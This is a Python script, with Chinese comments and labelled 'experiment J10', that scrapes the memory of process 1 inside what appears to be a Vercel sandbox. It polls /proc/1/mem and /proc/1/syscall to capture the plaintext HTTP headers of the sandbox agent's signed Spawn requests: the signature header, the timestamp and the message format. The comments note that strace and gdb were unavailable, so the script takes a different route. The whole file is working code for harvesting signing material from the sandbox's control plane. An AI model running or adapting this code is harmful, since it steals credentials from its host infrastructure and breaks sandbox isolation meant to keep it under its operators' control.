# 实验J10: 动态内存猎捕 agent 签名请求(HTTP头明文捕获)
# J9: strace/gdb 不可用 -> 改用 /proc/1/syscall + /proc/1/mem 轮询
# 原理: agent 发 Spawn 请求时 HTTP/1.1 头明文经过 pid1 用户态内存
#       大 payload cmd 放大窗口(多次 read + 长解析时间)
# 目标: 捕获 signature 头名 + timestamp 值 + 消息格式
import os, re, time, threading

BIN_PATTERNS = [b"POST /vercel.sandbox", b"signature", b"timestamp", b"Spawn", b"vercel-sandbox"]

def read_mem_segment(start, size):
    try:
        fd = os.open("/proc/1/mem", os.O_RDONLY)
        d = os.pread(fd, size, start)
        os.close(fd)
        return d
    except Exception:
        return b""

def get_maps():
    out = []
    try:
        for line in open("/proc/1/maps"):
            parts = line.split()
            if len(parts) < 2 or parts[1][0] != "r":
                continue
            a0, a1 = parts[0].split("-")
            out.append((int(a0, 16), int(a1, 16)))
    except Exception:
        pass
    return out

def get_agent_fds():
    """找出 init.sock 已建立连接(agent)对应的 pid1 fd 号"""
    fds = {}
    try:
        for entry in os.listdir("/proc/1/fd"):
            try:
                link = os.readlink(f"/proc/1/fd/{entry}")
                m = re.search(r"socket:\[(\d+)\]", link)
                if m:
                    fds[int(entry)] = int(m.group(1))
            except Exception:
                pass
    except Exception:
        pass
    # init.sock 的 CONNECTED 连接 inode
    conn_inodes = set()
    try:
        for line in open("/proc/1/net/unix"):
            parts = line.split()
            if len(parts) >= 7 and parts[6].endswith("init.sock"):
                st = parts[4]
                ino = int(parts[6 - 1]) if False else int(parts[5])
                # 列: Num RefCount Protocol Flags Type St Inode Path
                # parts: 0=num 1=ref 2=proto 3=flags 4=type 5=st 6=inode 7=path
                if parts[5] == "03":  # CONNECTED
                    conn_inodes.add(int(parts[6]))
    except Exception:
        pass
    agent_fds = [fd for fd, ino in fds.items() if ino in conn_inodes]
    return agent_fds

hits = []
stop = threading.Event()

def scanner():
    """全段内存扫描线程"""
    maps = get_maps()
    print(f"[scanner] {len(maps)} 个可读段, 开始扫描", flush=True)
    while not stop.is_set():
        for start, end in maps:
            size = min(end - start, 8 * 1024 * 1024)
            d = read_mem_segment(start, size)
            if not d:
                continue
            for pat in BIN_PATTERNS:
                i = d.find(pat)
                if i >= 0:
                    ctx = d[max(0, i-200):i+400]
                    s = re.sub(rb'[^\x20-\x7e]', b'.', ctx)
                    print(f"\n!!! HIT @0x{start+i:x} [{pat.decode()}] !!!", flush=True)
                    print(s.decode(errors='replace'), flush=True)
                    print("---", flush=True)
                    hits.append((start + i, pat))
                    break  # 每个段最多报1个模式, 减少重复
        # 扫描间隙

def syscall_watcher():
    """/proc/1/syscall 轮询: pid1 阻塞在 agent fd read 时抓 buffer"""
    fds = get_agent_fds()
    print(f"[watcher] agent fds: {fds}", flush=True)
    while not stop.is_set():
        try:
            sc = open("/proc/1/syscall").read().strip()
            if sc.startswith("running"):
                time.sleep(0.001)
                continue
            parts = sc.split()
            nr = int(parts[0])
            if nr in (0, 45, 47) and len(parts) > 2:  # read/recvfrom/recvmsg
                fd = int(parts[1], 16)
                buf = int(parts[2], 16)
                cnt = int(parts[3], 16)
                if cnt > 100:  # 大 buffer = HTTP 读缓冲
                    d = read_mem_segment(buf, min(cnt, 4096))
                    if d and (b"POST" in d or b"GET" in d or b"signature" in d or b"\x00\x00\x00" in d[:10]):
                        s = re.sub(rb'[^\x20-\x7e]', b'.', d[:2048])
                        print(f"\n!!! SYSCALL HIT fd={fd} nr={nr} cnt={cnt} @0x{buf:x} !!!", flush=True)
                        print(s.decode(errors='replace'), flush=True)
                        print("---", flush=True)
        except Exception:
            pass
        time.sleep(0.002)

print("== 启动观察线程 ==", flush=True)
t1 = threading.Thread(target=scanner, daemon=True)
t2 = threading.Thread(target=syscall_watcher, daemon=True)
t1.start()
t2.start()

# 主线程: 观察 100s(期间驱动会触发大 cmd)
deadline = time.time() + 100
print("== 观察 100s, 等待 agent 请求 ==", flush=True)
while time.time() < deadline and len(hits) < 20:
    time.sleep(1)
stop.set()
time.sleep(0.5)
print(f"done, hits={len(hits)}", flush=True)
